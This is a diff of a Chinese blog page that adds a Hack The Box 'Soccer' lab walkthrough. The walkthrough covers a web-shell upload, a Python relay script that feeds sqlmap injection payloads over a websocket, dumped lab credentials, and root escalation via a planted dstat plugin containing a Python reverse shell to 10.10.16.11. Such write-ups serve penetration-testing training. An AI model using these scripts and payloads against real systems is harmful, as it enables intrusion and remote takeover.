@@ -349,12 +349,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/oscp/">
-                                <span class="chip bg-color">oscp</span>
-                            </a>
-                        
                             <a href="/tags/hackthebox/">
                                 <span class="chip bg-color">hackthebox</span>
+                            </a>
+                        
+                            <a href="/tags/oscp/">
+                                <span class="chip bg-color">oscp</span>
                             </a>
                         
                     </div>
@@ -411,6 +411,16 @@
 <p><a target="_blank" rel="noopener" href="https://app.hackthebox.com/machines/519">靶机地址</a></p>
 </blockquote>
 <p><img src="/posts/91a184ba/18XZxVTFecE4QOhMMFA5VHg-16764286316592.png"></p>
+<h2 id="0-HTB配置"><a href="#0-HTB配置" class="headerlink" title="0.HTB配置"></a>0.HTB配置</h2><p>Hackthebox的靶机与vulnhub不同，不需要下载，为在线靶场。但是需要VPN连接才能测试靶机。首先需要先下载vpn文件，在右上角的下拉菜单中选择VPN接入点和服务，这里选的都是欧洲免费节点：</p>
+<p><img src="/posts/91a184ba/image-20230215202801084.png"></p>
+<p>然后点击下载vpn文件xxx.opvn，把该文件放到kali虚拟机中，kali自带openvpn程序，执行以下命令开启vpn。</p>
+<pre class="line-numbers language-none"><code class="language-none">openvpn xxx.opvn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>看到下图的红框中字样说明vpn连接成功，kali系统右上角会显示当前vpn的本机IP地址。而靶机IP地址是在启动hackthebox的machine后，在其网页中显示。</p>
+<p><img src="/posts/91a184ba/image-20230215202902364.png"></p>
+<p><img src="/posts/91a184ba/image-20230215203630108.png"></p>
+<p><img src="/posts/91a184ba/image-20230215203546151.png"></p>
+<p>现在知道了本机和靶机IP地址，可以开始测试啦！</p>
 <h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描：</p>
 <p><img src="/posts/91a184ba/image-20230215102854518.png"></p>
 <p>浏览器访问80端口，ip地址转为域名soccer.htb</p>
@@ -443,6 +453,139 @@
 <p>在这里看到了<a target="_blank" rel="noopener" href="http://soccer.htb/">http://soccer.htb</a> 页面的主页html和图片内容，在网页源码中可以看到这些文件的url。例如ground1.jpg可以通过<a target="_blank" rel="noopener" href="http://soccer.htb/ground1.jpg">http://soccer.htb/ground1.jpg</a> 访问。</p>
 <p><img src="/posts/91a184ba/image-20230215155727957.png"></p>
 <p>那么如果上传shell文件，则也可以通过上述路径触发反弹连接。</p>
+<p> 点击“uploads”上传shell文件：</p>
+<p><img src="/posts/91a184ba/image-20230215200817188-16768551890431.png"></p>
+<p>然后在upload路径下可以看到上传的文件，点击后面的“链接”按钮，就可以获得文件的访问url。</p>
+<p><img src="/posts/91a184ba/image-20230215201818304-16768551890442.png"></p>
+<p>这里注意：后台有一个程序会定期的清空upload目录，如果动作慢了，上传文件就会被删除。</p>
+<p>在kali中监听端口，然后访问反弹shell的url，反弹shell成功！</p>
+<p><img src="/posts/91a184ba/image-20230215201940733-16768551890443.png"></p>
+<h2 id="3-Websocket的SQL注入"><a href="#3-Websocket的SQL注入" class="headerlink" title="3.Websocket的SQL注入"></a>3.Websocket的SQL注入</h2><p>当前权限为www-data。在**&#x2F;etc&#x2F;nginx&#x2F;sites-enabled**目录中，发现了子域名。</p>
+<p><img src="/posts/91a184ba/image-20230215204044970-16768555593334.png"></p>
+<p>把soc-player.soccer.hackthebox加入到&#x2F;etc&#x2F;hosts文件中，然后访问<a target="_blank" rel="noopener" href="http://soc-player.soccer.hackthebox/">http://soc-player.soccer.hackthebox/</a></p>
+<p>与soccer.hackthebox不同的是，这个页面可以进行注册和登录，所以我们注册一个账号并登录：</p>
+<p><img src="/posts/91a184ba/image-20230215204701567-16768555593345.png"></p>
+<p>检查网页源码，看到这是一个验票器，验证地址是一个websocket，地址是ws:&#x2F;&#x2F;soc-player.soccer.hackthebox:9001 ，提交的数据是json，格式如：</p>
+<pre class="line-numbers language-none"><code class="language-none">“id&quot;:&quot;93570&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/posts/91a184ba/image-20230215210952350-16768555593346.png"></p>
+<p><img src="/posts/91a184ba/image-20230215211032418-16768555593347.png"></p>
+<p>这个id看起来可以作为sql注入点，查资料“<a target="_blank" rel="noopener" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">websocket如何进行sql注入</a>”，发现其提供一python脚本，将其修改后如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler
+<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse
+<span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connection
+
+ws_server <span class="token operator">=</span> <span class="token string">"ws://soc-player.soccer.hackthebox:9091"</span> <span class="token comment"># I changed here</span>
+
+<span class="token keyword">def</span> <span class="token function">send_ws</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_server<span class="token punctuation">)</span>
+	<span class="token comment"># If the server returns a response on connect, use below line	</span>
+	<span class="token comment">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>
+	
+	<span class="token comment"># For our case, format the payload in JSON</span>
+	message <span class="token operator">=</span> unquote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token comment"># replacing " with ' to avoid breaking JSON structure</span>
+	data <span class="token operator">=</span> <span class="token string">'&#123;"id":"%s"&#125;'</span> <span class="token operator">%</span> message <span class="token comment"># I changed here</span>
+
+	ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+	resp <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> resp<span class="token punctuation">:</span>
+		<span class="token keyword">return</span> resp
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		<span class="token keyword">return</span> <span class="token string">''</span>
+
+<span class="token keyword">def</span> <span class="token function">middleware_server</span><span class="token punctuation">(</span>host_port<span class="token punctuation">,</span>content_type<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+	<span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+			self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
+			<span class="token keyword">try</span><span class="token punctuation">:</span>
+				payload <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+			<span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+				payload <span class="token operator">=</span> <span class="token boolean">False</span>
+				
+			<span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+				content <span class="token operator">=</span> send_ws<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+			<span class="token keyword">else</span><span class="token punctuation">:</span>
+				content <span class="token operator">=</span> <span class="token string">'No parameters specified!'</span>
+
+			self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span> content_type<span class="token punctuation">)</span>
+			self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+			self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+			<span class="token keyword">return</span>
+
+	<span class="token keyword">class</span> <span class="token class-name">_TCPServer</span><span class="token punctuation">(</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>
+
+	httpd <span class="token operator">=</span> _TCPServer<span class="token punctuation">(</span>host_port<span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>
+	httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Starting MiddleWare Server"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+	middleware_server<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">8081</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+	<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>该脚本将在端口 8081 上创建一个 HTTP 服务器并提取第一个 GET 参数值，将值发送到  <code>send_ws</code> 函数，在那里它将按照易受攻击的 Web 应用程序的要求格式化为 JSON 消息。然后它将与  <code>ws_server</code> 变量中提到的服务器端点建立 WebSocket 连接并发送SQL注入payload。</p>
+<p>脚本准备好了，先运行脚本，再运行sqlmap：</p>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;localhost:8081&#x2F;?id&#x3D;1 --dump-all --exclude-sysdbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到soccer_db数据库的accounts表</p>
+<pre class="line-numbers language-none"><code class="language-none">+------+-------------------+----------+----------------------+
+| id   | email             | username | password             |
++------+-------------------+----------+----------------------+
+| 1324 | player@player.hackthebox | player   | PlayerOftheMatch2022 |
++------+-------------------+----------+----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用ssh连接，以player用户身份登录靶机系统，获得user flag。</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh player@soccer.hackthebox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>  密码：PlayerOftheMatch2022</p>
+<p><img src="/posts/91a184ba/image-20230215233707819-16768555593348.png"></p>
+<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>利用本地提权工具<a target="_blank" rel="noopener" href="https://www.kali.org/tools/peass-ng/">linpeas</a>查找提权向量，把linpeas.sh上传至靶机，然后执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;linpeas.sh -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>扫描到<strong>doas</strong>程序的配置文件中，写道player用户可以无密码以root身份执行<strong>dstat</strong>程序：</p>
+<p><img src="/posts/91a184ba/image-20230217205502975-16768555593349.png"></p>
+<p>这里首先要清楚相关的两个程序是什么：</p>
+<p><a target="_blank" rel="noopener" href="https://man.openbsd.org/doas">doas</a>：以其他用户身份执行命令，类似于sudo。可以用-u参数指定用户。</p>
+<p><a target="_blank" rel="noopener" href="https://linux.die.net/man/1/dstat">dstat</a>：是ifstat,vmstat等命令的替代。这里知道我们可以用root身份执行它就行了。</p>
+<p>那么怎样把root shell的payload借dstat执行呢？先搜索一下这个程序的相关文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name dstat -type d 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/posts/91a184ba/image-20230217210559143-167685555933410.png"></p>
+<p><img src="/posts/91a184ba/image-20230217210715104-167685555933411.png"></p>
+<p>与dstat程序的手册说明对比，得知这个路径下，全部都是dstat程序的插件，统一命名为dstat_xxx.py，调用的时候就加参数–xxx。</p>
+<p><img src="/posts/91a184ba/image-20230217211122215-167685555933412.png" alt="dstat插件说明"></p>
+<p>那么我们创建一个python shell插件，在&#x2F;tmp文件夹创建dstat_soccer.py：</p>
+<pre class="line-numbers language-none"><code class="language-none">touch dstat_soccer.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>python文件内容：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.16.11"</span><span class="token punctuation">,</span><span class="token number">2929</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后复制到**&#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat文件夹**，这个文件夹可以写入且程序也会寻找这个目录下的插件：</p>
+<pre class="line-numbers language-none"><code class="language-none">cp dstat_soccer.py &#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后，在本机监听端口等待反连，然后以root身份执行dstat程序插件</p>
+<pre class="line-numbers language-none"><code class="language-none">doas -u root &#x2F;usr&#x2F;bin&#x2F;dstat --soccer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功提权到root，并获取flag：</p>
+<p><img src="/posts/91a184ba/image-20230217213738381-167685555933513.png"></p>
+<p>虽然磕磕绊绊，但是第一个HTB靶机收获很多，呱唧呱唧！</p>
+<p><img src="/posts/91a184ba/image-20230217213942868-167685555933514.png"></p>
 
                 
             </div>
@@ -507,12 +650,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/oscp/">
-                                    <span class="chip bg-color">oscp</span>
-                                </a>
-                            
                                 <a href="/tags/hackthebox/">
                                     <span class="chip bg-color">hackthebox</span>
+                                </a>
+                            
+                                <a href="/tags/oscp/">
+                                    <span class="chip bg-color">oscp</span>
                                 </a>
                             
                         </div>
@@ -593,12 +736,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/vulnhub/">
-                        <span class="chip bg-color">vulnhub</span>
-                    </a>
-                    
                     <a href="/tags/oscp/">
                         <span class="chip bg-color">oscp</span>
+                    </a>
+                    
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
@@ -646,12 +789,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/vulnhub/">
-                        <span class="chip bg-color">vulnhub</span>
-                    </a>
-                    
                     <a href="/tags/oscp/">
                         <span class="chip bg-color">oscp</span>
+                    </a>
+                    
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
